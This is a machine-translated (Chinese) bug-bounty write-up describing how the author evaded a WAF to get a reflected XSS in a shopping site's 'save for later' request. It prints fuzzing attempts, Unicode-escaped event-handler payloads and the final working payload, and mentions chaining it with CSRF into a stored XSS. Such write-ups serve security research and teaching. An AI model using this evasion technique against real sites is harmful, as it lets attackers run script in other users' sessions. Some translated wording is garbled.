<html>
<head>
<title>Unicode vs WAF — XSS WAF Bypass .</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Unicode vs WAF — XSS WAF旁路。</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/unicode-vs-waf-xss-waf-bypass-128cd9972a30?source=collection_archive---------0-----------------------#2019-06-05">https://infosecwriteups.com/unicode-vs-waf-xss-waf-bypass-128cd9972a30?source=collection_archive---------0-----------------------#2019-06-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="cc3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨，读者们，</p><p id="6db8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在第一个<strong class="jp ir">开斋节，穆巴拉克</strong>向所有人。愿真主在这神圣的时刻带给你快乐、幸福、和平和繁荣。在这个快乐的开斋节，祝你和你的家人快乐！<strong class="jp ir">T3【艾德慕】T4！因此，在这个神圣的时刻，我想让我们分享我的一个发现，作为开斋节的奖励😜！</strong></p><p id="4744" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从标题中你可能知道这是一篇关于XSS晶片旁路使用<strong class="jp ir"> UNICODE </strong>的文章。因此，让我们给你一个关于我正在测试的应用程序的小想法。有一个选项叫做<strong class="jp ir">保存以备后用</strong>它保存你账户中的项目以备后用。该请求看起来像是:-</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/21f28a0b528069af03fb9eeec211cd5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JRmBTYhkldn5BIcAbLrs7A.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">我们的目标应用程序<strong class="bd lc">保存为以后的</strong>选项请求</figcaption></figure><p id="6829" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果用户通过了正确的身份验证，那么这个post请求将在用户帐户中保存项目以备后用，如果用户没有通过正确的身份验证，那么它将只返回一些值。因此，我手动模糊处理参数，并注意到<strong class="jp ir">通道</strong>参数值在经过身份验证的&amp;和未经身份验证的场景中都反映在响应体中，而没有正确转义。我发送了一个通道参数值类似于<strong class="jp ir">" channel ":" XSS \ "&gt;&lt;"</strong>的请求，响应是:-</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="0c96" class="li lj iq le b gy lk ll l lm ln">&lt;a class="link nc-text-regular nc-blue js-movetocart" data-giftitemid="&lt;ID&gt;" data-skuid="&lt;ID&gt;" data-itemnumber="&lt;ID&gt;"<br/>                     data-productid="&lt;ID&gt;" data-channel="xss"&gt;&lt;" data-quantity="1"<br/>                     data-isbundleitem="false" role="link" tabindex="0" aria-label="label"&gt;Move to cart&lt;/a&gt;</span></pre><p id="f2fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们输入的值在<strong class="jp ir"> <em class="kl"> &lt; a &gt; </em> </strong>标记内，我们可以将其转义，因为<strong class="jp ir">引号&amp;小于/大于</strong>符号没有被正确过滤。所以我认为我有很多方法在这里做XSS，直到我输入<strong class="jp ir">" channel ":" XSS \ " onclick = \ " alert(1)"</strong>，得到的回应是:-</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/d93a07a39b4cabf8e2db03af9ce99171.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CPRNCl8YQI6Y2-hmy4Qvdw.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">WAF！WAF！WAF！！！🤕</figcaption></figure><p id="db69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此有一个晶片在适当位置。为了绕过它，我开始模糊，结果是:-</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="6c84" class="li lj iq le b gy lk ll l lm ln">"channel":"xss\"onclick=\"alert(1)" ==&gt; WAF<br/>"channel":"xss\"xss=\"alert(1)" ==&gt; WAF<br/>"channel":"xss\"onclick=\"alert(1)" ==&gt; WAF<br/>"channel":"xss\"xss=\"xxx(1)" ==&gt; No WAF</span></pre><p id="dddd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我尝试创建一个标签，而不是在<strong class="jp ir">&lt;&gt;</strong>标签中添加事件属性，我输入<strong class="jp ir">" channel ":" XSS \ "&gt;&lt;XSS&gt;test "</strong>，得到的响应是:-</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="24f3" class="li lj iq le b gy lk ll l lm ln">&lt;a class="link nc-text-regular nc-blue js-movetocart" data-giftitemid="&lt;ID&gt;" data-skuid="&lt;ID&gt;" data-itemnumber="&lt;ID&gt;"<br/>                     data-productid="&lt;ID&gt;" data-channel="xss"&gt;test" data-quantity="1"<br/>                     data-isbundleitem="false" role="link" tabindex="0" aria-label="label"&gt;Move to cart&lt;/a&gt;</span></pre><p id="2a9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以它也删除了看起来像标签的上下文。所以我们没有创建标签的优势。所以我们唯一的办法就是绕过WAF使用<strong class="jp ir">&lt;&gt;</strong>标签中的事件属性。所以我试着用<a class="ae lo" href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xss/html-event-attributes.txt" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">html-event-attributes . txt</strong></a><strong class="jp ir"/>by<a class="ae lo" href="https://github.com/fuzzdb-project/fuzzdb" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">fuzz db</strong></a>做了一个bruteforce，看看有没有事件没有被WAF屏蔽，没有得到什么有趣的东西。然后我考虑了一下unicode，输入了一个随机的unicode，看看它是否能解码，结果它把unicode解码成了原来的字符。所以现在我又开始玩<strong class="jp ir"> unicode+events </strong>，结果是:-</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="0df1" class="li lj iq le b gy lk ll l lm ln">"channel":"xss\"\u003E\u003Cxss\u003Etest" ==&gt; data-channel="xss"&gt;&lt;xss&gt;test"<br/>"channel":"xss\"xss=\"co\u006efirm(domain)" ==&gt; No WAF<br/>"channel":"xss\"onc\u006Cick=\"co\u006efirm(domain)" ==&gt; HTTP/1.1 403 Forbidden</span></pre><p id="9b6f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们有了新的优势，也有了新的问题。</p><ul class=""><li id="150d" class="lp lq iq jp b jq jr ju jv jy lr kc ls kg lt kk lu lv lw lx bi translated">优势是我们现在可以使用unicodes创建HTML标签。</li><li id="8cfb" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">缺点是，即使在使用unicodes之后，当我们添加一个事件<strong class="jp ir"> onc\u006Cick </strong>时，我们会得到一个新的错误<strong class="jp ir"> HTTP/1.1 403 Forbidden </strong>。</li></ul><p id="4409" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我再次从<a class="ae lo" href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xss/html-event-attributes.txt" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">html-event-attributes . txt</strong></a><strong class="jp ir">+Unicode</strong>制作了一个单词表，并且我得到了<strong class="jp ir">on mous \ u 0045 leave</strong>&amp;<strong class="jp ir">ond \ u 0072 ag</strong>events，给出了<strong class="jp ir"> HTTP/1.1 200 OK </strong>，我们还可以创建HTML标签。所以我做了最后一次装载</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="36de" class="li lj iq le b gy lk ll l lm ln">xss\"\u003E\u003Ch1  onmous\u0045leave=co\u006efirm(domain)\u003ECome to Me\u003C/h1\u003E\u003Cbr\u003E\u003C!--</span></pre><p id="97d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">响应正文为:- </strong></p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="160b" class="li lj iq le b gy lk ll l lm ln">&lt;a class="link nc-text-regular nc-blue js-movetocart" data-giftitemid="&lt;ID&gt;" data-skuid="&lt;ID&gt;" data-itemnumber="&lt;ID&gt;"<br/>                     data-productid="&lt;ID&gt;" data-channel="xss"&gt;&lt;h1  onmouseleave=confirm(domain)&gt;come to me&lt;/h1&gt;&lt;br&gt;&lt;!--" data-quantity="1"<br/>                     data-isbundleitem="false" role="link" tabindex="0" aria-label="label"&gt;Move to cart&lt;/a&gt;</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi md"><img src="../Images/809e534a36b044efc9dc5b3c8e1cd883.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ad4FOyZv_m06DHSmEfRXSA.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">未经验证的用户的基于帖子的XSS</figcaption></figure><p id="713d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">把鼠标指针放在<strong class="jp ir">里，靠近我</strong>然后离开&amp;吊杆😎🤗</p><p id="9ba6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于这是一个POST请求，并且没有CSRF保护，所以我为认证用户链接了<strong class="jp ir"> CSRF + XSS = P2存储的XSS </strong>😎。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi me"><img src="../Images/c76a4ffdcf0fda53c3ce9f4e4a816adc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*p5x0Nx6vJdYVkCgoT6_glA.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated"><strong class="bd lc"> CSRF + XSS = P2为认证用户存储XSS </strong>😎</figcaption></figure><p id="e6f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢阅读。看看我的<a class="ae lo" href="https://www.youtube.com/channel/UCaFDPNZiwrzHjaV3rpyP64g" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> YouTube频道</strong> </a>我分享的一些POC。</p><p id="016b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">跟我来:- </strong></p><div class="mf mg gp gr mh mi"><a href="https://twitter.com/prial261" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">prial Islam (@prial261) | Twitter</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">prial Islam的最新推文(@prial261)。一个热衷于破坏安全的少年😉😉😉。帕布纳…</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">twitter.com</p></div></div><div class="mr l"><div class="ms l mt mu mv mr mw kw mi"/></div></div></a></div><div class="mf mg gp gr mh mi"><a href="https://www.facebook.com/prial261" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">普里阿勒·伊斯兰·汗</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">Prial Islam Khan在脸书。加入脸书，与Prial Islam Khan和您可能认识的其他人联系。脸书给…</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">www.facebook.com</p></div></div><div class="mr l"><div class="mx l mt mu mv mr mw kw mi"/></div></div></a></div><p id="b43e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">欢呼</strong>😋😉</p></div></div>    
</body>
</html>